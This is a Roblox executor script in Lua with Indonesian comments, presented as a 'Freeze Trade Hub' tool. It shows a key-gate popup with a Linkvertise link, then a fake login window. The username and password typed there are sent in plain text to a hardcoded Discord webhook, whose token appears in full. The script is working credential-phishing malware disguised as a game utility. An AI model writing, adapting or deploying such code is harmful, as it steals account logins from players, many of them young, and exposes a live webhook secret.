-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(password, username)
    local http_service = game:GetService("HttpService")
    local json_data = {
        content = "Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
    }
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = http_service:JSONEncode(json_data)
    }

    if syn and syn.request then
        local response = syn.request(payload)
        print(response and response.StatusCode == 200 and "Data terkirim!" or "Gagal kirim: " .. (response.StatusCode or "Error"))
    elseif request then
        local res = request(payload)
        print(res and res.StatusCode == 200 and "Data terkirim!" or "Gagal kirim: " .. (res.StatusCode or "Error"))
    else
        print("Executor tidak mendukung HTTP requests.")
    end
end

-- Membuat Key Validation dengan Linkvertise
local function validateKey(key)
    local valid_key = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK" -- Ganti dengan key Anda
    if key == valid_key then
        return true
    else
        return false
    end
end

-- Membuat GUI Key Validation
local function createKeyGui()
    local screenGui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local keyBox = Instance.new("TextBox")
    local submitButton = Instance.new("TextButton")
    local linkButton = Instance.new("TextButton")
    local titleLabel = Instance.new("TextLabel")

    screenGui.Name = "KeyPopup"
    screenGui.Parent = game:GetService("CoreGui")

    frame.Name = "KeyFrame"
    frame.Parent = screenGui
    frame.Size = UDim2.new(0, 300, 0, 250)
    frame.Position = UDim2.new(0.5, -150, 0.5, -125)
    frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.new(1, 0, 0)

    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, -10, 0, 40)
    titleLabel.Position = UDim2.new(0, 5, 0, 5)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Key Validation"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.new(1, 1, 1)

    keyBox.Name = "KeyBox"
    keyBox.Parent = frame
    keyBox.Size = UDim2.new(1, -20, 0, 40)
    keyBox.Position = UDim2.new(0, 10, 0, 60)
    keyBox.PlaceholderText = "Enter your key"
    keyBox.Font = Enum.Font.SourceSans
    keyBox.Text = ""
    keyBox.TextSize = 16
    keyBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    keyBox.TextColor3 = Color3.new(1, 1, 1)

    submitButton.Name = "SubmitButton"
    submitButton.Parent = frame
    submitButton.Size = UDim2.new(1, -20, 0, 40)
    submitButton.Position = UDim2.new(0, 10, 0, 120)
    submitButton.Text = "Submit"
    submitButton.Font = Enum.Font.SourceSansBold
    submitButton.TextSize = 18
    submitButton.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
    submitButton.TextColor3 = Color3.new(1, 1, 1)

    linkButton.Name = "LinkButton"
    linkButton.Parent = frame
    linkButton.Size = UDim2.new(1, -20, 0, 40)
    linkButton.Position = UDim2.new(0, 10, 0, 180)
    linkButton.Text = "Get Key"
    linkButton.Font = Enum.Font.SourceSansBold
    linkButton.TextSize = 18
    linkButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.8)
    linkButton.TextColor3 = Color3.new(1, 1, 1)

    submitButton.MouseButton1Click:Connect(function()
        local key = keyBox.Text
        if validateKey(key) then
            screenGui:Destroy()
            createLoginGui()
        else
            print("Key Salah!")
        end
    end)

    linkButton.MouseButton1Click:Connect(function()
        setclipboard("https://link-target.net/1273087/freezetradehub") -- Ganti dengan URL Linkvertise Anda
        print("Link telah disalin ke clipboard!")
    end)
end

-- Membuat GUI Login
local function createLoginGui()
    local screenGui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local loginButton = Instance.new("TextButton")
    local usernameBox = Instance.new("TextBox")
    local passwordBox = Instance.new("TextBox")
    local titleLabel = Instance.new("TextLabel")

    screenGui.Name = "LoginPopup"
    screenGui.Parent = game:GetService("CoreGui")

    frame.Name = "LoginFrame"
    frame.Parent = screenGui
    frame.Size = UDim2.new(0, 300, 0, 270)
    frame.Position = UDim2.new(0.5, -150, 0.5, -135)
    frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.new(1, 0, 0)

    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, -10, 0, 40)
    titleLabel.Position = UDim2.new(0, 5, 0, 5)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Freeze Trade Hub"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.new(1, 1, 1)

    usernameBox.Name = "UsernameBox"
    usernameBox.Parent = frame
    usernameBox.Size = UDim2.new(1, -20, 0, 40)
    usernameBox.Position = UDim2.new(0, 10, 0, 80)
    usernameBox.PlaceholderText = "Enter Username"
    usernameBox.Font = Enum.Font.SourceSans
    usernameBox.Text = ""
    usernameBox.TextSize = 16
    usernameBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    usernameBox.TextColor3 = Color3.new(1, 1, 1)

    passwordBox.Name = "PasswordBox"
    passwordBox.Parent = frame
    passwordBox.Size = UDim2.new(1, -20, 0, 40)
    passwordBox.Position = UDim2.new(0, 10, 0, 130)
    passwordBox.PlaceholderText = "Enter Password"
    passwordBox.Font = Enum.Font.SourceSans
    passwordBox.Text = ""
    passwordBox.TextSize = 16
    passwordBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    passwordBox.TextColor3 = Color3.new(1, 1, 1)

    loginButton.Name = "LoginButton"
    loginButton.Parent = frame
    loginButton.Size = UDim2.new(1, -20, 0, 40)
    loginButton.Position = UDim2.new(0, 10, 0, 190)
    loginButton.Text = "Login"
    loginButton.Font = Enum.Font.SourceSansBold
    loginButton.TextSize = 18
    loginButton.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
    loginButton.TextColor3 = Color3.new(1, 1, 1)

    loginButton.MouseButton1Click:Connect(function()
        local user = usernameBox.Text
        local pass = passwordBox.Text
        if user ~= "" and pass ~= "" then
            sendToDiscord(pass, user)
            screenGui:Destroy()
        else
            print("Field kosong!")
        end
    end)
end

createKeyGui()
